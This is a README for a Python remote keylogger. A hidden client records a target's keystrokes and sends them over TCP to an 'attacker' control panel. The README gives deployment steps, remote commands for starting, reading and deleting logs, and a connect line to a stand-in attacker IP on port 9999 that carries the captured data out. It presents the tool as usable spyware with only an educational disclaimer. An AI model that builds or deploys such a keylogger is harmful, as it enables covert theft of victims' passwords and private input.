# 🔐 Keylogger Remote Controller (Python)

This project is a **Python-based remote keylogger system** consisting of two components:

1. `client.py` – a keylogger program that runs on the target system and sends captured keystrokes to the server.
2. `hacker.py` – a control panel interface that runs on the attacker's machine to remotely control and retrieve keystrokes from the target.

> ⚠️ **Disclaimer**: This tool is intended strictly for **educational purposes**, **ethical hacking labs**, and **controlled environments only**. Misuse of this software may be illegal and is not the responsibility of the author.

---

## 🧠 How It Works

- The **client** runs silently on the target machine, records every keystroke, and stores it in a local file.
- The **server (hacker.py)** waits for the client to connect.
- The attacker can issue remote commands such as:
  - `start_logger` – start recording keys
  - `read_data` – retrieve the recorded keystrokes
  - `stop_logger` – stop and delete the log
  - `exit` – close the session

---

## ⚙️ Features

- Real-time keylogging using `pynput`
- Communication over TCP using Python’s `socket` module
- Threaded keylogger with file-based log handling
- Simple command-and-response interface

---

## 🚀 Usage Instructions

### ✅ 1. Setup

Make sure Python 3.x is installed on both attacker and target systems.

Install required dependencies:

```bash
pip install pynput
````

---

### 🖥️ 2. Running the Server (Attacker Side)

```bash
python hacker.py
```

* The server will start listening on port `9999` for incoming connections from the client.

---

### 🎯 3. Running the Client (Target Side)

Edit the `client.py` file and set the attacker's IP address:

```python
sc.connect(('YOUR_ATTACKER_IP', 9999))  # Replace with attacker's IP
```

Then run:

```bash
python client.py
```

---

### 💻 4. Control Panel Commands

Once the client connects, the control panel supports these commands:

| Command        | Description                        |
| -------------- | ---------------------------------- |
| `start_logger` | Begin keylogging                   |
| `read_data`    | Receive keystrokes from the client |
| `stop_logger`  | Stop keylogger and delete log file |
| `exit`         | Terminate the session              |

---

## 📎 Notes

* Default port: **9999**
* Keylogs are stored on the client side temporarily as `.log_data.txt`
* Use in **virtual lab or test environment** only

---

## 👨‍💻 Author
* A. Fakhrul Adani

## 🛡️ Legal Notice

> This software is provided for educational and ethical penetration testing only. The developers are not responsible for any misuse or damage caused by this tool.
